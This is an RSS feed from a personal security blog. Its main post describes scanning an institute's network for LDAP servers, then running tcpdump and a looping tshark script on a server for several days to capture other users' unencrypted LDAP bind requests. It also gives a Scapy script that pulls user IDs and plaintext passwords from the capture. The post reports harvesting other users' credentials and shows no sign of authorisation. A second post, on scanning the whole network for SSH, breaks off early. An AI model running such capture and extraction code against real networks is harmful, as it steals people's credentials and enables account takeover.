<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Infosec on Gill.Singh.A</title>
        <link>http://localhost:1313/tags/infosec/</link>
        <description>Recent content in Infosec on Gill.Singh.A</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Sat, 28 Sep 2024 07:09:31 +0530</lastBuildDate><atom:link href="http://localhost:1313/tags/infosec/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests</title>
        <link>http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/</link>
        <pubDate>Sat, 28 Sep 2024 07:09:31 +0530</pubDate>
        
        <guid>http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/</guid>
        <description>&lt;img src="http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis.png" alt="Featured image of post Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests" /&gt;&lt;h2 id=&#34;ldap-servers-on-network&#34;&gt;LDAP Servers on Network
&lt;/h2&gt;&lt;p&gt;I decided to investigate the LDAP servers within my institute&amp;rsquo;s private network, which utilizes Class B private IP addresses.&lt;br /&gt;
I employed &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/Port-Scanner&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A/Port-Scanner&lt;/a&gt; to scan for LDAP ports (389, 636, 3268, 3269) and discovered 49 devices with at least one of these ports open.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/port_scan.png&#34;
	width=&#34;1131&#34;
	height=&#34;619&#34;
	srcset=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/port_scan_hu5214438431600738618.png 480w, http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/port_scan_hu7060229708197509510.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;LDAP Port Scan&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;182&#34;
		data-flex-basis=&#34;438px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;ldap-anonymous-bind&#34;&gt;LDAP Anonymous Bind
&lt;/h2&gt;&lt;p&gt;Following that, I used &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/LDAP-Anonymous-Bind-Checker&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A/LDAP-Anonymous-Bind-Checker&lt;/a&gt; to assess LDAP Anonymous Bind support, finding that 32 devices allowed anonymous binding.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_anonymous_bind_check.png&#34;
	width=&#34;1217&#34;
	height=&#34;619&#34;
	srcset=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_anonymous_bind_check_hu11417373108919641133.png 480w, http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_anonymous_bind_check_hu7436161976449918966.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;LDAP Anonymous Bind Check&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;196&#34;
		data-flex-basis=&#34;471px&#34;
	
&gt;&lt;br /&gt;
After some exploration, I discovered the LDAP server responsible for managing authentication requests for our Computer Center’s credentials.&lt;br /&gt;
The server was identified by the hostname &lt;strong&gt;ldap.cc.iitk.ac.in&lt;/strong&gt;, supported LDAP Anonymous Bind.&lt;/p&gt;
&lt;h2 id=&#34;computer-center-ldap-server&#34;&gt;Computer Center LDAP Server
&lt;/h2&gt;&lt;p&gt;After manually exploring &lt;strong&gt;ldap.cc.iitk.ac.in&lt;/strong&gt;, I discovered that I could retrieve any student’s mobile number using a simple search query.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/cc_ldap_student_info.png&#34;
	width=&#34;1058&#34;
	height=&#34;914&#34;
	srcset=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/cc_ldap_student_info_hu6706158349291098143.png 480w, http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/cc_ldap_student_info_hu14491039418514966273.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;CC LDAP Student Information&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;115&#34;
		data-flex-basis=&#34;277px&#34;
	
&gt;&lt;br /&gt;
However, what truly alarmed me was that the server was not utilizing SSL for data transmission over the network. This meant that all Computer Center credentials used for authenticating to services like Web Mail and SSH servers were being transmitted as plaintext, making them easily accessible to anyone intercepting the traffic.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_authentication.png&#34;
	width=&#34;1763&#34;
	height=&#34;863&#34;
	srcset=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_authentication_hu7729842253027930951.png 480w, http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_authentication_hu1957787686004190964.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;LDAP Authentication&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;204&#34;
		data-flex-basis=&#34;490px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;network-traffic-capture&#34;&gt;Network Traffic Capture
&lt;/h2&gt;&lt;p&gt;To verify my suspicions, I launched &lt;strong&gt;tcpdump&lt;/strong&gt; on a remote server at our institute where I had root access and where users can SSH in using their Computer Center credentials. I began intercepting the network traffic on that server. Specifically, I filtered for port 389 to capture only LDAP traffic.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo /usr/sbin/tcpdump -s &lt;span class=&#34;m&#34;&gt;65535&lt;/span&gt; -w network_traffic_capture.pcap &lt;span class=&#34;s1&#34;&gt;&amp;#39;tcp port 389 and src 172.31.1.148 and dst 172.31.1.1&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;After successfully logging into the server using my Computer Center credentials on another terminal, I stopped the network capture and downloaded the pcap file for further analysis.&lt;/p&gt;
&lt;h2 id=&#34;network-traffic-analysis&#34;&gt;Network Traffic Analysis
&lt;/h2&gt;&lt;p&gt;After opening the pcap file in &lt;strong&gt;Wireshark&lt;/strong&gt; and conducting some analysis, I was able to find my Computer Center user ID and password in plaintext within an LDAP Bind Request.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis.png&#34;
	width=&#34;1723&#34;
	height=&#34;694&#34;
	srcset=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis_hu15684315963115790267.png 480w, http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis_hu6391675548106611853.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Network Traffic Analysis&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;248&#34;
		data-flex-basis=&#34;595px&#34;
	
&gt;&lt;br /&gt;
This confirmed my suspicions: the Computer Center credentials were indeed transmitted as plaintext.&lt;/p&gt;
&lt;h2 id=&#34;capturing-using-tshark&#34;&gt;Capturing using tshark
&lt;/h2&gt;&lt;p&gt;Next, I created a simple bash script that utilized &lt;strong&gt;tshark&lt;/strong&gt; to capture LDAP network traffic on the server and save it into a pcap file. The script processes the pcap file once it reaches 100 MB, filtering to include only LDAP Bind Requests and storing the results in my NFS (Network File System) Directory.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#! /bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; true&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	/usr/sbin/tshark -w webhome.pcap -i &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -f &lt;span class=&#34;s2&#34;&gt;&amp;#34;tcp port 389 and host 172.31.1.148 and dst host 172.31.1.1&amp;#34;&lt;/span&gt; -a filesize:100000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	/usr/sbin/tshark -r webhome.pcap -R &lt;span class=&#34;s2&#34;&gt;&amp;#34;frame contains \&amp;#34;ou=People,dc=iitk,dc=ac,dc=in\&amp;#34; and ldap.bindRequest&amp;#34;&lt;/span&gt; -w webhome_filtered_&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;.pcap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	chmod &lt;span class=&#34;m&#34;&gt;600&lt;/span&gt; webhome_filtered_&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;.pcap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	rm -f webhome.pcap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;index++&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;extracting-passwords-from-capture-file&#34;&gt;Extracting Passwords from Capture File
&lt;/h2&gt;&lt;p&gt;After collecting LDAP Bind Requests for some days, I downloaded the processed capture file and created a simple Python script using &lt;a class=&#34;link&#34; href=&#34;https://scapy.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Scapy&lt;/a&gt; to extract the user IDs and their corresponding passwords. This allowed me to determine how many credentials I had successfully retrieved.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#! /usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scapy.all&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rdpcap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LDAP_BindRequest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LDAP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;colorama&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Fore&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;packets&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rdpcap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;              &lt;span class=&#34;c1&#34;&gt;# argv[1] Network Capture File (.pcap)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;packets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LDAP_BindRequest&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LDAP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LDAP_BindRequest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authentication&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;val&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fore&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CYAN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LDAP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LDAP_BindRequest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bind_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;val&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fore&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RESET&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fore&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GREEN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LDAP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LDAP_BindRequest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authentication&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;val&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fore&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RESET&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The following was the output&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/passwords_extracted.png&#34;
	width=&#34;938&#34;
	height=&#34;254&#34;
	srcset=&#34;http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/passwords_extracted_hu15989953465181069283.png 480w, http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/passwords_extracted_hu13346716360919305969.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Extraced Passwords&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;369&#34;
		data-flex-basis=&#34;886px&#34;
	
&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion
&lt;/h2&gt;&lt;p&gt;This investigation revealed significant security concerns regarding the transmission of sensitive data over unencrypted connections. It&amp;rsquo;s crucial to implement proper security measures to protect user information in our digital landscape.&lt;br /&gt;
As we navigate our digital landscape, it’s essential to ensure that proper security measures are in place to protect user information.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Building a Heat Map for IIT Kanpur&#39;s Computer Labs</title>
        <link>http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/</link>
        <pubDate>Tue, 24 Sep 2024 04:24:41 +0530</pubDate>
        
        <guid>http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/</guid>
        <description>&lt;img src="http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/heat_map_webhome.png" alt="Featured image of post Building a Heat Map for IIT Kanpur&#39;s Computer Labs" /&gt;&lt;h2 id=&#34;ssh-services-at-iit-kanpur&#34;&gt;SSH Services at IIT Kanpur
&lt;/h2&gt;&lt;p&gt;IIT Kanpur&amp;rsquo;s network uses Class B private IP addresses. Within this private network, students, faculty and staff can SSH into various servers using their Computer Center credentials to access different services. Examples of such servers include the GPU server, APP server, and MATH server.&lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/gpu_server_ssh.png&#34;
	width=&#34;910&#34;
	height=&#34;297&#34;
	srcset=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/gpu_server_ssh_hu8126236527895794791.png 480w, http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/gpu_server_ssh_hu961427184623176891.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;GPU Server SSH&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;306&#34;
		data-flex-basis=&#34;735px&#34;
	
&gt;&lt;br /&gt;
Each user has a 2GB directory on the Computer Center&amp;rsquo;s NFS (Network File System), which is mounted on all servers. This allows users to access their files across multiple servers without needing to copy them to each one, reducing the need for additional storage on individual servers. &lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/nfs_storage.png&#34;
	width=&#34;510&#34;
	height=&#34;366&#34;
	srcset=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/nfs_storage_hu8269651536020412203.png 480w, http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/nfs_storage_hu5967961997424418485.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;NFS Storage&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;139&#34;
		data-flex-basis=&#34;334px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;port-scan-of-whole-private-network&#34;&gt;Port Scan of whole Private Network
&lt;/h2&gt;&lt;p&gt;I couldn’t find a complete list of servers supporting SSH authentication with our Computer Center credentials and was eager to discover all the servers users could SSH into.&lt;br /&gt;
So, I conducted a port scan of IIT Kanpur&amp;rsquo;s entire private network for port 22 (SSH) using &lt;a class=&#34;link&#34; href=&#34;https://github.com/Gill-Singh-A/Port-Scanner.git&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Gill-Singh-A/Port-Scanner&lt;/a&gt; and identified around 4,000 devices with the port open. &lt;br /&gt;
&lt;img src=&#34;http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/assets/images/ssh_port_scan.png&#34;
	width=&#34;1007&#34;
